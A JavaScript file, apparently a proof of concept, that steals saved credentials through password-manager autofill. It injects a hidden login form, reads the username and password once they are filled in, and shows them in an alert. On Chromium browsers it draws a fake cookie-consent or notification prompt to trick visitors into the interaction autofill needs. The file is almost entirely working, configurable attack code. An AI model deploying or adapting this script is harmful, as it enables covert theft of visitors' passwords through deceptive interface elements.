var overlay = "yes";            // yes, no
var scrolling = "no";           // yes, no
var dialog = "notification";    // notification, cookie

createLoginForm();


window.setTimeout(function(){
    hideLoginForm();

    // function especially for chromium-based browsers
    // show notification or cookie dialog that require a user interaction
    if (!!window.chrome && !document.getElementById("password").value) {
        showDialog();
        addDialogEvents();
    }
}, 1500);


function createLoginForm() {
	var divlogin = document.createElement("div");
	divlogin.style = "position: fixed; bottom: -19.9999px; z-index: -2147483647; opacity:0.2";
	divlogin.id = "divlogin";
	divlogin.innerHTML  = ' \
			<form method="POST" action="login.html" id="form" onchange="getFormValues()"> \
				<input type="text" id="username" name="username" autocomplete=on required> \
				<input type="password" id="password" name="password" autocomplete=on required> \
				<button type="submit" id="submit">Login</button> \
			</form>';
    document.body.appendChild(divlogin);
}

// remove submit button to prevent autosubmit feature in password managers
function removeSubmitButton() {
  if (document.getElementById("submit")) {
        var element = document.getElementById("form");
        var child = document.getElementById("submit");
        element.removeChild(child);
  }
}

function hideLoginForm() {
    divlogin.style.display = "none";
}

function getFormValues() {
    usr=document.getElementById("username").value;
    pw=document.getElementById("password").value;

    if (usr && pw) {
        removeSubmitButton();
        hideLoginForm();
        alert(usr+":"+pw);
    }
}

function showDialog() {
    var overlaydiv = "";
    var boxshadow = "";

    var dialogdiv = document.createElement("div");

    if (overlay == "yes") {
        overlaydiv = '<div id="overlay"></div>';
        boxshadow = 'box-shadow:0 1px 12px rgb(5 27 44 / 33%), 0 2px 32px rgb(5 27 44 / 48%) !important;';
    } else {
        boxshadow = 'box-shadow:0 1px 6px rgb(5 27 44 / 6%), 0 2px 32px rgb(5 27 44 / 16%) !important;';
    }

    if (dialog == "cookie") {
        dialogdiv.innerHTML = '<style>.no-scroll {overflow: hidden;} #overlay {position: fixed; display: block; width: 100%; height: 100%; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(0,0,0,0.5); z-index: 225859400; animation: .5s showoverlay; } #overlay.remove-overlay {animation: .5s hideoverlay; opacity: 0; } @keyframes showoverlay {from { opacity: 0; } to { opacity: 1; } } @keyframes hideoverlay {from { opacity: 1; } to { opacity: 0; } } #cookie-dialog {display: block!important; position: relative!important; opacity: 1!important; visibility: visible!important; margin: 290px auto 0!important; width: 650px!important; -webkit-box-sizing: content-box!important; -moz-box-sizing: content-box!important; box-sizing: content-box!important; max-width: 90%!important; background: #ffffff!important; padding: 12px 24px!important; overflow: hidden!important; z-index: 9999!important; border: 10px solid #5fa624!important; box-shadow: #333 1px 1px 10px 1px!important; line-height: 1.2!important; text-align: left!important; } #cookie-div {font-family: Arial,serif!important;width: 100%!important;height: 100%!important;margin: 0 auto!important;position: fixed!important;top: 0!important;left: 0!important;font-family: Arial,serif!important;z-index: 2258594000!important;overflow-y: auto!important;} #cookie-dialog h2 {font-size: 20px!important; line-height: 16px!important; font-weight: 700!important; margin: 10px 0 16px!important; } #cookie-dialog p {margin: 12px 0!important; line-height: 16px!important; text-indent: 0!important; font-weight: 400!important; font-size: 10pt!important; } #cookie-dialog #button-row {display: flex!important; flex-wrap: nowrap!important; justify-content: space-between!important; margin-right: 265px!important; } .btn {border: 1px solid #000000!important; font-family: Arial,serif!important; color: #000000!important; background: #ffffff!important; padding: 7px 10px!important; text-decoration: none!important; } #cookie-dialog #accept-all {border: none!important; color: #ffffff!important; background: #5fa624!important; text-decoration: none!important; } #links {display: flex!important; font-size: 12px!important; margin-top: 20px!important; } #cookie-dialog a {color: #5fa624!important; text-decoration: none!important; } #cookie-dialog a:hover {cursor: pointer!important; } .bar {margin: 0 5px!important; width: auto!important; height: auto!important; position: relative!important; } #accept-all:hover {cursor: pointer!important; background: #5fa624!important; text-decoration: none!important; } .btn:hover {cursor: pointer!important; background: #ffffff!important; text-decoration: none!important; }</style> \
                            '+overlaydiv+'<div id="cookie-div"><div id="cookie-dialog"> <div> <h2>Privacy &amp; Transparency</h2> <p>We and our partners use cookies to  Store and/or access information on a device. We and our partners use data for  Personalised ads and content, ad and content measurement, audience insights and product development. An example of data being processed may be a unique identifier stored in a cookie. Some of our partners may process your data as a part of their legitimate business interest without asking for consent. To view the purposes they believe they have legitimate interest for, or to object to this data processing use the vendor list link below. The consent submitted will only be used for data processing originating from this website. If you would like to change your settings or withdraw consent at any time, the link to do so is in our privacy policy accessible from our home page.</p><p><span id="button-row"><button class="btn">Manage Settings</button><button id="accept-all" class="btn" style="color: rgb(255, 255, 255) !important;">Continue with Recommended Cookies</button> </span> </p> <div id="links"> <a href="javascript:void(0);">Vendor List</a> <span class="bar">|</span><a href="javascript:void(0);">Privacy Policy</a></div></div></div></div>';

    } else {
        dialogdiv.innerHTML = '<style>.no-scroll {overflow: hidden;} #overlay {position: fixed; display: block; width: 100%; height: 100%; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(0,0,0,0.5); z-index: 225859400; animation: .5s showoverlay; } #overlay.remove-overlay {animation: .5s hideoverlay; opacity: 0; } @keyframes showoverlay {from { opacity: 0; } to { opacity: 1; } } @keyframes hideoverlay {from { opacity: 1; } to { opacity: 0; } } #notification-container #notification-dialog .button {box-sizing: border-box; padding: 0.75em 1.5em; font-size: 1em; border-radius: .25em; font-weight: 400; box-shadow: unset; display: -ms-flexbox; display: flex; float: right; position: relative; line-height: 1.5; text-align: center; white-space: nowrap; vertical-align: middle; cursor: pointer; -webkit-user-select: none; font-family: inherit; letter-spacing: 0.05em; margin: 0; border: 1px solid transparent; } #notification-container #notification-dialog .button.secondary {box-shadow: none; background: white !important; color: #0078D1 !important; margin-right: 0.714em; } #notification-container #notification-dialog .sizing {display: block; -webkit-backface-visibility: initial !important; backface-visibility: initial !important; } #notification-container #notification-dialog .notification-body-message {box-sizing: border-box; padding: 0 0 0 1em; font-weight: 400; float: left; width: calc(100% - 80px); line-height: 1.45em; -o-user-select: none; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; cursor: default; color: #051B2C !important; } #notification-container #notification-dialog .notification-body-icon img.icon {width: 45px; top: 3px; left: 50%; transform: translateX(-50%); position: absolute; height: 45px; } #notification-container #notification-dialog .notification-body-icon {box-sizing: border-box; float: left; width: 80px; height: 80px; position: relative; } #notification-container #notification-dialog .notification-body {box-sizing: border-box; margin: 0; } #notification-container #notification-dialog {width: 500px; box-sizing: border-box; max-width: 100%; margin: 0 auto; '+boxshadow+' background: white !important; color: #051b2c; padding: 1.5em 1.5em; border-bottom-left-radius: 0.5em; border-bottom-right-radius: 0.5em; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Seoe UI Symbol"; } #notification-container {font-size: 16px; position: fixed; z-index: 2258594000; left: 0; right: 0; -webkit-font-smoothing: initial; } #notification-container.slide-down {top: 0; } #notification-dialog .sizing {content: ""; display: block; height: 0; clear: both; } #notification-container #notification-dialog .button.primary {background: #0078D1; color: white !important; } #notification-container #notification-dialog .button.primary:hover {background: #0062ab; } #notification-container.slide-down #notification-dialog {-webkit-animation-name: animationDown; -webkit-animation-iteration-count: 1; -webkit-animation-timing-function: ease-out; -webkit-animation-duration: 400ms; -webkit-animation-fill-mode: forwards; animation-name: animationDown; animation-iteration-count: 1; animation-timing-function: ease-out; animation-duration: 400ms; animation-fill-mode: forwards; -webkit-font-smoothing: initial; } #notification-container.slide-up {-webkit-animation-name: animationUp; -webkit-animation-iteration-count: 1; -webkit-animation-timing-function: ease-out; -webkit-animation-duration: 500ms; -webkit-animation-fill-mode: forwards; animation-name: animationUp; animation-iteration-count: 1; animation-timing-function: ease-out; animation-duration: 500ms; animation-fill-mode: forwards; } @keyframes animationUp {0% {transform: translateY(0%); } 100% {transform: translateY(-150%); } } @keyframes animationDown {0% {transform: translateY(-150%); } 100% {transform: translateY(0); }}</style> \
                            '+overlaydiv+'</div><div id="notification-container" class="notification-container slide-down"><div id="notification-dialog" class="notification-dialog"><div class="notification-body" id="notification-body"><div class="notification-body-icon"><img class="icon" alt="icon" src=\'data:image/svg+xml,%3Csvg fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40"%3E%3Cg clip-path="url(%23clip0)"%3E%3Cpath fill-rule="evenodd" clip-rule="evenodd" d="M33.232 28.434a2.5 2.5 0 001.768.733 1.667 1.667 0 010 3.333H5a1.667 1.667 0 110-3.333 2.5 2.5 0 002.5-2.5v-8.104A13.262 13.262 0 0118.333 5.122V1.667a1.666 1.666 0 113.334 0v3.455A13.262 13.262 0 0132.5 18.563v8.104a2.5 2.5 0 00.732 1.767zM16.273 35h7.454a.413.413 0 01.413.37 4.167 4.167 0 11-8.28 0 .417.417 0 01.413-.37z" fill="%23BDC4CB"/%3E%3C/g%3E%3Cdefs%3E%3CclipPath id="clip0"%3E%3Cpath fill="%23fff" d="M0 0h40v40H0z"/%3E%3C/clipPath%3E%3C/defs%3E%3C/svg%3E\'></div><div class="notification-body-message">We\'d like to send you notifications for the latest news and updates.</div><div class="sizing"></div></div><div id="buttons"><button class="primary button">Allow</button><button class="secondary button">Cancel</button><div class="sizing"></div></div></div>';
    }

    document.body.appendChild(dialogdiv);

    if (scrolling == "no") {
        document.getElementsByTagName("body")[0].classList.add("no-scroll");
    }

}

function addDialogEvents() {
    window.addEventListener('click', function(){

        if (overlay == "yes") {
            hideOverlay();
        }

        if (scrolling == "no") {
            document.getElementsByTagName("body")[0].classList.remove("no-scroll");
        }

        if (dialog == "cookie") {
           document.getElementById("cookie-div").style.display = "none";
        } else {
             hideDialog();
        }

    });

    window.addEventListener('keydown', function(){

        if (overlay == "yes") {
            hideOverlay();
        }

        if (scrolling == "no") {
            document.getElementsByTagName("body")[0].classList.remove("no-scroll");
        }

        if (dialog == "cookie") {
            document.getElementById("cookie-div").style.display = "none";
        } else {
             hideDialog();
        }
    });

}

function hideDialog() {
    document.getElementById("notification-container").classList.add("slide-up");
}

function hideOverlay() {
    var x = document.getElementById("overlay");
    x.classList.add("remove-overlay");
    window.setTimeout(function(){
  	     x.style.display = "none";
    }, 500);
}
